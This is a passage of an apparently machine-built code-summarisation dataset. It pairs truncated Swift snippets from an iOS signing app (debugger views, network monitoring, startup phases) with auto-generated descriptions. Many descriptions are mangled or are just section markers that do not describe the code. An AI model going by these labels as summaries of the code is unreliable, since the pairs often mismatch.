    "code": "private func setupRequestView() {\n// Create labels for request details\nlet urlTitleLabel = createTitleLabel(text: \"URL:\")\nlet urlValueLabel = createValueLabel(text: request.url.absoluteString)\n\nlet methodTitleLabel = createTitleLabel(text: \"Method:\")\nlet methodValueLabel = createValueLabel(text: request.method)\n\nlet headersTitleLabel = createTitleLabel(text: \"Headers:\")\nlet headersValueLabel = createValueLabel(text: formatHeaders(request.requestHeaders))",
    "nl": "Function setupRequestView - sets uprequestview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1190",
    "code": "private func setupResponseView() {\n// Create labels for response details\nlet statusTitleLabel = createTitleLabel(text: \"Status:\")\nlet statusValueLabel = createValueLabel(text: \"\\(request.responseStatus)\")\n\nlet headersTitleLabel = createTitleLabel(text: \"Headers:\")\nlet headersValueLabel = createValueLabel(text: formatHeaders(request.responseHeaders))\n\nlet bodyTitleLabel = createTitleLabel(text: \"Body:\")\nlet bodyValueLabel = createValueLabel(text: request.responseBody ?? \"None\")",
    "nl": "Function setupResponseView - sets upresponseview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1191",
    "code": "private func setupActions() {\n// Add target for segmented control\nsegmentedControl.addTarget(self, action: #selector(segmentChanged), for: .valueChanged)\n}\n\n// MARK: - Actions\n\n@objc private func segmentChanged(_ sender: UISegmentedControl) {",
    "nl": "Function setupActions - sets upactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1192",
    "code": "@objc private func segmentChanged(_ sender: UISegmentedControl) {\n// Toggle visibility of request and response views\nrequestView.isHidden = sender.selectedSegmentIndex == 1\nresponseView.isHidden = sender.selectedSegmentIndex == 0\n}\n\n// MARK: - Helper Methods\n\nprivate func createTitleLabel(text: String) -> UILabel {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1193",
    "code": "private func createTitleLabel(text: String) -> UILabel {\nlet label = UILabel()\nlabel.translatesAutoresizingMaskIntoConstraints = false\nlabel.font = UIFont.systemFont(ofSize: 16, weight: .medium)\nlabel.text = text\nreturn label\n}\n\nprivate func createValueLabel(text: String) -> UILabel {",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1194",
    "code": "private func createValueLabel(text: String) -> UILabel {\nlet label = UILabel()\nlabel.translatesAutoresizingMaskIntoConstraints = false\nlabel.font = UIFont.systemFont(ofSize: 14)\nlabel.text = text\nlabel.numberOfLines = 0\nreturn label\n}\n\nprivate func formatHeaders(_ headers: [String: String]) -> String {",
    "nl": "Function createValueLabel - creates valuelabel",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1195",
    "code": "private func formatHeaders(_ headers: [String: String]) -> String {\nif headers.isEmpty {",
    "nl": "Function formatHeaders - implements formatheaders functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/NetworkMonitorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1196",
    "code": "class PerformanceViewController: UIViewController {\n// MARK: - Properties\n\n/// The debugger engine\nprivate let debuggerEngine = DebuggerEngine.shared\n\n/// Logger instance\nprivate let logger = Debug.shared\n\n/// Segmented control for switching between metrics",
    "nl": "/ View controller for the performance tab in the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1197",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupUI()\nsetupActions()\n\n// Set title\ntitle = \"Performance\"\n\n// Start monitoring",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1198",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Resume monitoring if needed\nif updateTimer == nil {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1199",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\n\n// Pause monitoring\nstopMonitoring()\n}\n\n// MARK: - Setup\n\nprivate func setupUI() {",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1200",
    "code": "private func setupUI() {\n// Set background color\nview.backgroundColor = UIColor.systemBackground\n\n// Add segmented control\nview.addSubview(segmentedControl)\n\n// Add chart view\nview.addSubview(chartView)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1201",
    "code": "private func setupActions() {\n// Add target for segmented control\nsegmentedControl.addTarget(self, action: #selector(segmentChanged), for: .valueChanged)\n}\n\n// MARK: - Actions\n\n@objc private func segmentChanged(_ sender: UISegmentedControl) {",
    "nl": "Function setupActions - sets upactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1202",
    "code": "@objc private func segmentChanged(_ sender: UISegmentedControl) {\n// Update current metric type\nswitch sender.selectedSegmentIndex {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1203",
    "code": "private func startMonitoring() {\n// Start update timer\nupdateTimer = Timer.scheduledTimer(\ntimeInterval: 1.0,\ntarget: self,\nselector: #selector(updateMetrics),\nuserInfo: nil,\nrepeats: true\n)\n",
    "nl": "MARK: - Monitoring",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1204",
    "code": "private func stopMonitoring() {\n// Stop update timer\nupdateTimer?.invalidate()\nupdateTimer = nil\n}\n\n@objc private func updateMetrics() {",
    "nl": "Function stopMonitoring - implements stopmonitoring functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1205",
    "code": "@objc private func updateMetrics() {\n// In a real implementation, this would use real performance monitoring APIs\n// For now, just generate random metrics\n\n// Update CPU usage\nmetrics.cpuUsage = min(max(metrics.cpuUsage + Double.random(in: -10 ... 10), 0), 100)\n\n// Update memory usage\nmetrics.memoryUsage = min(max(metrics.memoryUsage + Double.random(in: -20 ... 20), 0), 1024)\n",
    "nl": "Function updateMetrics - updates metrics",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1206",
    "code": "private func updateUI() {\n// Update current usage label and description based on metric type\nswitch currentMetricType {",
    "nl": "Function updateUI - updates ui",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1207",
    "code": "private func getColorForPercentage(_ percentage: Double) -> UIColor {\nif percentage < 30 {",
    "nl": "Function getColorForPercentage - retrieves colorforpercentage",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1208",
    "code": "extension PerformanceViewController: UITableViewDelegate {\nfunc tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1209",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n}\n}\n\n// MARK: - UITableViewDataSource\n\nextension PerformanceViewController: UITableViewDataSource {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1210",
    "code": "extension PerformanceViewController: UITableViewDataSource {\nfunc numberOfSections(in _: UITableView) -> Int {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1211",
    "code": "func numberOfSections(in _: UITableView) -> Int {\nreturn 1\n}\n\nfunc tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1212",
    "code": "func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nswitch currentMetricType {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1213",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"StatCell\", for: indexPath)\n\n// Configure cell based on metric type\nswitch currentMetricType {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1214",
    "code": "enum MetricType {\ncase cpu\ncase memory\ncase gpu\ncase energy\n}\n\n/// Performance metrics\nstruct PerformanceMetricsData {",
    "nl": "MARK: - Supporting Types / Metric type",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "1215",
    "code": "struct PerformanceMetricsData {\nvar cpuUsage: Double = 25.0\nvar memoryUsage: Double = 256.0\nvar gpuUsage: Double = 15.0\nvar energyImpact: Double = 3.0\n}\n",
    "nl": "/ Performance metrics",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/PerformanceViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "1216",
    "code": "class VariablesViewController: UIViewController {\n// MARK: - Properties\n\n/// The debugger engine\nprivate let debuggerEngine = DebuggerEngine.shared\n\n/// Logger instance\nprivate let logger = Debug.shared\n\n/// Table view for displaying variables",
    "nl": "/ View controller for the variables tab in the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1217",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupUI()\nsetupActions()\nsetupNotifications()\n\n// Set title\ntitle = \"Variables\"\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1218",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Reload variables when view appears\nreloadVariables()\n}\n\n// MARK: - Setup\n\nprivate func setupUI() {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1219",
    "code": "private func setupUI() {\n// Set background color\nview.backgroundColor = UIColor.systemBackground\n\n// Add search bar\nview.addSubview(searchBar)\n\n// Add table view\nview.addSubview(tableView)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1220",
    "code": "private func setupActions() {\n// Add target for refresh control\nrefreshControl.addTarget(self, action: #selector(refreshVariables), for: .valueChanged)\n}\n\nprivate func setupNotifications() {",
    "nl": "Function setupActions - sets upactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1221",
    "code": "private func setupNotifications() {\n// Listen for execution state change notifications\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleExecutionStateChanged),\nname: .debuggerExecutionPaused,\nobject: nil\n)\n\nNotificationCenter.default.addObserver(",
    "nl": "Function setupNotifications - sets upnotifications",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1222",
    "code": "@objc private func refreshVariables() {\n// Reload variables\nreloadVariables()\n\n// End refreshing\nrefreshControl.endRefreshing()\n}\n\n@objc private func handleExecutionStateChanged(_: Notification) {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1223",
    "code": "@objc private func handleExecutionStateChanged(_: Notification) {\n// Reload variables when execution state changes\nreloadVariables()\n}\n\n// MARK: - Helper Methods\n\nprivate func reloadVariables() {",
    "nl": "Function handleExecutionStateChanged - implements handleexecutionstatechanged functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1224",
    "code": "private func reloadVariables() {\n// Get variables from debugger engine\nvariables = debuggerEngine.getVariables()\n\n// Apply filter\nfilterVariables()\n\n// Reload table view\ntableView.reloadData()\n}",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1225",
    "code": "private func filterVariables() {\n// Apply search filter\nif searchText.isEmpty {",
    "nl": "Function filterVariables - implements filtervariables functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1226",
    "code": "extension VariablesViewController: UITableViewDelegate {\nfunc tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1227",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\n// Get variable\nlet variable = filteredVariables[indexPath.row]\n\n// Show variable details alert\nlet alertController = UIAlertController(\ntitle: variable.name,\nmessage: \"Type: \\(variable.type)\\nValue: \\(variable.value)\\nSummary: \\(variable.summary)\",",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1228",
    "code": "func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat {\nreturn 60\n}\n}\n\n// MARK: - UITableViewDataSource\n\nextension VariablesViewController: UITableViewDataSource {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1229",
    "code": "extension VariablesViewController: UITableViewDataSource {\nfunc tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1230",
    "code": "func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn filteredVariables.count\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1231",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nguard let cell = tableView.dequeueReusableCell(\nwithIdentifier: VariableTableViewCell.reuseIdentifier,\nfor: indexPath\n) as? VariableTableViewCell else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1232",
    "code": "extension VariablesViewController: UISearchBarDelegate {\nfunc searchBar(_: UISearchBar, textDidChange searchText: String) {",
    "nl": "MARK: - UISearchBarDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1233",
    "code": "func searchBar(_: UISearchBar, textDidChange searchText: String) {\n// Update search text\nself.searchText = searchText\n\n// Apply filter\nfilterVariables()\n\n// Reload table view\ntableView.reloadData()\n}",
    "nl": "Function searchBar - implements searchbar functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1234",
    "code": "func searchBarSearchButtonClicked(_ searchBar: UISearchBar) {\n// Dismiss keyboard\nsearchBar.resignFirstResponder()\n}\n}\n\n// MARK: - VariableTableViewCell\n\nclass VariableTableViewCell: UITableViewCell {",
    "nl": "Function searchBarSearchButtonClicked - implements searchbarsearchbuttonclicked functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1235",
    "code": "class VariableTableViewCell: UITableViewCell {\n// MARK: - Properties\n\nstatic let reuseIdentifier = \"VariableTableViewCell\"\n\n/// Name label\nprivate let nameLabel: UILabel = {",
    "nl": "MARK: - VariableTableViewCell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1236",
    "code": "private func setupUI() {\n// Add name label\ncontentView.addSubview(nameLabel)\n\n// Add type label\ncontentView.addSubview(typeLabel)\n\n// Add value label\ncontentView.addSubview(valueLabel)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1237",
    "code": "func configure(with variable: Variable) {\n// Set name label\nnameLabel.text = variable.name\n\n// Set type label\ntypeLabel.text = variable.type\n\n// Set value label\nvalueLabel.text = variable.value\n",
    "nl": "MARK: - Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1238",
    "code": "extension AppDelegate {\n// MARK: - AI Learning Integration\n\n/// Initialize AI Learning system\nfunc initializeAILearning() {",
    "nl": "extension AppDelegate - implements functionality related to app delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+AILearning.swift",
    "code_type": "extension"
  },
  {
    "id": "1239",
    "code": "func initializeAILearning() {\n// Disable AI learning by default\nif UserDefaults.standard.object(forKey: \"AILearningEnabled\") == nil {",
    "nl": "MARK: - AI Learning Integration / Initialize AI Learning system",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+AILearning.swift",
    "code_type": "function"
  },
  {
    "id": "1240",
    "code": "@objc func handleModelUpdate() {\nDebug.shared.log(message: \"AI model updated with local learning\", type: .info)\n\n// Reload the model in CoreMLManager\nCoreMLManager.shared.loadModelWithLocalLearning()\n}\n}\n",
    "nl": "Function handleModelUpdate - implements handlemodelupdate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+AILearning.swift",
    "code_type": "function"
  },
  {
    "id": "1241",
    "code": "extension AppDelegate {\n/// Set up network monitoring to track connectivity changes\nfunc setupNetworkMonitoring() {",
    "nl": "MARK: - Network Monitoring Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift",
    "code_type": "extension"
  },
  {
    "id": "1242",
    "code": "func setupNetworkMonitoring() {\nDebug.shared.log(message: \"Setting up enhanced network monitoring\", type: .info)\n\n// Use our custom NetworkMonitor singleton that internally uses NWPathMonitor\n// This provides a consistent interface regardless of iOS version\nsetupEnhancedNetworkMonitoring()\n}\n\n/// Set up enhanced network monitoring with offline mode support and UI indicators\nprivate func setupEnhancedNetworkMonitoring() {",
    "nl": "/ Set up network monitoring to track connectivity changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift",
    "code_type": "function"
  },
  {
    "id": "1243",
    "code": "private func setupEnhancedNetworkMonitoring() {\n// Initialize the shared NetworkMonitor singleton\nlet networkMonitor = NetworkMonitor.shared\n\n// Initialize OfflineSigningManager which depends on NetworkMonitor\nlet offlineManager = OfflineSigningManager.shared\n\n// Register for connection status changes\nnetworkMonitor.connectionStatusChanged = { [weak self] isConnected, connectionType in",
    "nl": "/ Set up enhanced network monitoring with offline mode support and UI indicators",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift",
    "code_type": "function"
  },
  {
    "id": "1244",
    "code": "private func connectionTypeToString(_ type: ConnectionType) -> String {\nswitch type {",
    "nl": "/ Helper function to convert ConnectionType enum to string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift",
    "code_type": "function"
  },
  {
    "id": "1245",
    "code": "private func showNetworkStatusChangeAlert(isConnected: Bool, connectionType: ConnectionType) {\n// Only show alerts for transitions to offline or to expensive connection type\nlet shouldShowAlert = !isConnected || connectionType == .cellular\n\nguard shouldShowAlert, let topVC = UIApplication.shared.topMostViewController() else {",
    "nl": "/ Show an alert for important connection status changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift",
    "code_type": "function"
  },
  {
    "id": "1246",
    "code": "extension Preferences {\n/// Whether to show network status change alerts\nstatic var showNetworkAlerts: Bool {",
    "nl": "MARK: - Preferences Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift",
    "code_type": "extension"
  },
  {
    "id": "1247",
    "code": "extension AppDelegate {\n/// Set up components in phases for improved stability\nfunc setupPhaseOne() {",
    "nl": "MARK: - Phased Initialization Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift",
    "code_type": "extension"
  },
  {
    "id": "1248",
    "code": "func setupPhaseOne() {\nDebug.shared.log(message: \"Starting phase 1 initialization (lightweight components)\", type: .info)\n\n// Initialize essential network monitoring\nsetupNetworkMonitoring()\n\n// Validate server certificates for server functionality and offline signing\n_ = ServerCertificateManager.shared.validateCertificates()\n\n// Show startup popup if needed - low resource impact",
    "nl": "/ Set up components in phases for improved stability",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift",
    "code_type": "function"
  },
  {
    "id": "1249",
    "code": "func setupPhaseTwo() {\nDebug.shared.log(message: \"Starting phase 2 initialization (medium-weight components)\", type: .info)\n\n// Initialize image pipeline (method name kept as in original codebase)\nimagePipline()\n\n// Set up essential background tasks\nsetupBackgroundTasks()\n\n// Initialize terminal components",
    "nl": "/ Set up medium-weight components (phase 2)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift",
    "code_type": "function"
  },
  {
    "id": "1250",
    "code": "func setupPhaseThree() {\nDebug.shared.log(message: \"Starting phase 3 initialization (heavy-weight components)\", type: .info)\n\n// Skip in safe mode\nif SafeModeLauncher.shared.inSafeMode {",
    "nl": "/ Set up heavy components (phase 3) with safeguards",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift",
    "code_type": "function"
  },
  {
    "id": "1251",
    "code": "func initializeComponentsWithCrashProtection() {\nDebug.shared.log(message: \"Initializing components with crash protection\", type: .info)\n\n// Use structured error handling to prevent crashes during initialization\n// Phase 1 - safe to run immediately\nsetupPhaseOne()\n\n// Phase 2 - defer slightly\nDispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { [weak self] in",
    "nl": "/ Method with phased initialization for crash protection",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift",
    "code_type": "function"
  },
  {
    "id": "1252",
    "code": "func shouldProceedWithMemoryCheck() -> Bool {\nlet memoryUsed = getMemoryUsage()\nDebug.shared.log(message: \"Current memory usage: \\(String(format: \"%.1f%%\", memoryUsed * 100))\", type: .info)\n\n// If memory usage is over 70%, delay heavy operations\nreturn memoryUsed < 0.7\n}\n\n/// Get current memory usage as a percentage (0.0 to 1.0)\nprivate func getMemoryUsage() -> Double {",
    "nl": "/ Check available memory before heavy operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift",
    "code_type": "function"
  },
  {
    "id": "1253",
    "code": "private func getMemoryUsage() -> Double {\nvar info = mach_task_basic_info()\nvar count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size) / 4\n\nlet kerr: kern_return_t = withUnsafeMutablePointer(to: &info) {",
    "nl": "/ Get current memory usage as a percentage (0.0 to 1.0)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift",
    "code_type": "function"
  },
  {
    "id": "1254",
    "code": "extension AppDelegate {\n/// Phase 5: Initialize terminal components\nfunc initializePhase5_Terminal() {",
    "nl": "extension AppDelegate - implements functionality related to app delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedTerminal.swift",
    "code_type": "extension"
  },
  {
    "id": "1255",
